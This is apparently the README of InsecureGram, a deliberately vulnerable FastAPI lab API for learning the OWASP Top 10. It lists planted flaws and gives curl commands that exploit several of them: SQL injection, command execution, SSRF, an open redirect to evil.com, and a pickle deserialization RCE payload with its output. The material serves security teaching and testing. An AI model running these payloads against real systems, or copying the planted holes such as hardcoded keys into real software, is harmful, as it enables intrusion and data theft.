# 🛡️ InsecureGram: A Deliberately Vulnerable FastAPI API

![1000104142](https://github.com/user-attachments/assets/56405ce4-b853-4d83-bbe1-715762a4c6a4)

Welcome to InsecureGram — a deliberately insecure RESTful API built using FastAPI to demonstrate real-world web application vulnerabilities, based on the [OWASP Top 10](https://owasp.org/www-project-top-ten/). It is meant for educational and research purposes only.

> ⚠️ This project is intentionally insecure. Do not deploy this in a production environment.

---

## 📦 Project Overview

This API mimics a realistic backend service similar to a social media app. It includes endpoints for:

- User registration and login with JWT
- User profiles and search (SQL injection)
- Command execution
- File upload
- SSRF simulation
- Legacy and admin routes
- open redirection
- Insecure deserialization
- Hardcoded secrets

---

## 📁 Project Structure

```
InsecureGram/
│
├── app/
│   ├── main.py                  # FastAPI app initialization
│   ├── database.py              # SQLite DB setup and session handling
│   ├── models.py                # SQLAlchemy User model
│   ├── config.py                # Global config and JWT secret key
│   ├── dependencies.py          # Shared auth logic (get_current_user)
│   ├── auth.py                  # Login and registration endpoints
│   ├── users.py                 # Search, profiles, legacy access
│   ├── upload.py                # File upload (unsafe mode)
│   ├── command.py               # Remote command execution (RCE)
│   ├── proxy.py                 # SSRF endpoint
│   ├── admin.py                 # Admin-only data access
│   ├── deprecated.py            # Legacy endpoint
│   ├── redirect.py              # open redirection enbpoint
│   ├── ssrf_server.py           # SSRF internal FastAPI server (optional)
├── static/uploads/              # Uploaded files
├── test.db                      # SQLite DB (created at runtime)
├── Dockerfile                   # Docker config
├── docker-compose.yml           # Compose config
├── README.md                    # You are here
```

---

## 🚨 Vulnerabilities Covered

This project contains examples of the following vulnerabilities:
| #   | Vulnerability                           | Description                                             |
| --- | --------------------------------------- | ------------------------------------------------------- |
| V1  | Admin header-based authentication       | Admin API uses static API key in header (X-API-KEY) for endpoints /api/admin/users and /api/admin/deserialize    |
| V2  | SQL Injection (SQLi)                    | Raw SQL query constructed from user input               |
| V3  | Hardcoded secrets                       | SECRET_KEY and admin API key stored in config.py       |
| V4  | Open CORS policy                        | Accepts requests from any origin                        |
| V5  | JWT with guessable secret               | Secret used to sign tokens is weak                      |
| V6  | Insecure deserialization (pickle)       | Admin endpoint loads raw Python pickle                  |
| V7 | Server-Side Request Forgery (SSRF)      | Proxy endpoint makes arbitrary HTTP GET requests        |
| V8 | Unsafe file uploads                     | Allows writing files outside upload dir if unsafe=true  |
| V9 | Open Redirect                           | Redirect endpoint blindly forwards to user-supplied URL |
| V10 | Remote Command Execution (RCE)          | /api/cmd/exec executes system commands unsafely             |
| V11 | Deprecated API Exposure (/api/v1/users/info)          | Legacy API endpoint still active             |


---

## 🔐 JWT Example

### JWT Creation:
```python
from jose import jwt
token = jwt.encode({"sub": "alice", "is_admin": False}, "mysecret", algorithm="HS256")
```

### JWT Header (for curl):
```bash
-H "Authorization: Bearer <your_jwt_here>"
```

---

## 🧪 Example Endpoints and Test Commands

Here’s how you can interact with the API using `curl`:

### 🟢 Auth

🔐 Register
```bash
curl -i -X POST http://localhost:8000/api/auth/register -H "Content-Type: application/json" \
-d '{"username": "alice", "password": "alice123"}'
```

🔐 Login
```bash
curl -i -X POST http://localhost:8000/api/auth/login \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=alice&password=alice123"
```

---

### 🆔 User Info (No IDOR :), Type your own id)

```bash
curl -i -G http://localhost:8000/api/users/{User_ID} \
-H "Authorization: Bearer <JWT>"
```

---

### 🔎 User Search (SQLi vulnerable)
```bash
curl -i -G http://localhost:8000/api/users/search \
-H "Authorization: Bearer <JWT>" \
--data-urlencode "field=username" --data-urlencode "keyword=' OR 1=1 --"
```

---
### 📁 File Upload (Unsafe mode)
```bash
curl -i -X POST http://localhost:8000/api/upload?unsafe=true \
-F "file=@evil.py" \
-H "Authorization: Bearer <JWT>"
```

---

### 💣 Remote Command Execution (RCE)
```bash
curl -i -G http://localhost:8000/api/cmd/exec \
-H "Authorization: Bearer <JWT>" \
--data-urlencode "cmd=whoami"
```

---

### 🛰️ SSRF (127.0.0.1:9000 is internal service that is not accessed by normal clients)
```bash
curl -i -G http://localhost:8000/api/proxy \
-H "Authorization: Bearer <JWT>" \
--data-urlencode "url=http://127.0.0.1:9000/read?name=secrets.txt"
```

---

### 🗂️ Admin Access (with API key)
```bash
curl -i -H "Authorization: Bearer <JWT>" \
-H "X-API-KEY: admin123" \
http://localhost:8000/api/admin/users
```

---

### 🧬💥 RCE With Insecure Deserialization (with API key)

To exploit this, first craft a malicious Pickle payload in Python:

```exploit_payload.py```:
```python
import pickle
import subprocess

payload = pickle.dumps((
subprocess.check_output,
(["whoami"],)
)).hex()

print(payload)
```
Run the script to generate a hexadecimal payload string.

Example output: ```8004952f000000000000008c0a73756270726f63657373948c0c636865636b5f6f75747075749493945d948c0677686f616d699461859486942e```

Then, send it using curl to the vulnerable endpoint:

```bash
curl -i -X POST http://localhost:8000/api/admin/deserialize \
-H "Authorization: Bearer <JWT>" \
-H "X-API-KEY: admin123" \
-H "Content-Type: application/json" \
-d '{"payload": "8004952f000000000000008c0a73756270726f63657373948c0c636865636b5f6f75747075749493945d948c0677686f616d699461859486942e"}'

```
If successful, the server will execute the command (e.g., whoami) and return the result in the output.

#### Response:

```bash
{
"output": "kali\n"
}
```


---

### 🗂️ Insecure Redirection
```bash
curl -i -H "Authorization: Bearer <JWT>" \
http://localhost:8000/api/redirect?target=https://evil.com
```

---

### 📡 Legacy API Endpoint
```bash
curl -H "Authorization: Bearer <JWT>" \
http://localhost:8000/api/v1/users/info

```

---

# 🚀 How to Run the Project

Choose one of the following methods to start the API server:

## 1- 🐳 Run with Docker (Recommended)

- Step 1: Clone the repository

```bash
git clone https://github.com/Osama2012/InsecureGram.git
cd insecuregram
```

- Step 2: Build and run the containers

```bash
docker compose up --build
```

This will launch the FastAPI application and an SQLite-backed service in a containerized environment.

- Step 3: Access the API

Visit http://localhost:8000/docs in your browser.

## 2- 💻 Run Locally (Without Docker)

Ensure Python 3.12 and pipenv are installed.

- Step 1: Install dependencies

```bash
pipenv install
```

- Step 2: Activate the virtual environment
  
```bash
pipenv shell
```

- Step 3: Run the FastAPI server
  
```bash
uvicorn app.main:app --reload
```
---

## 🚫 Disclaimer

This project is for educational purposes only. Do not use it against real-world services or expose it publicly. You are fully responsible for any misuse.

---

## ✅ Credits

- Built using FastAPI + SQLAlchemy
- Inspired by OWASP Top 10
- Maintained by the security research community

---

## 💡 Contribution Ideas

- Add logging for audit
- Sanitize file uploads
- Parameterize raw SQL queries
- Improve CORS policy
- Add unit tests
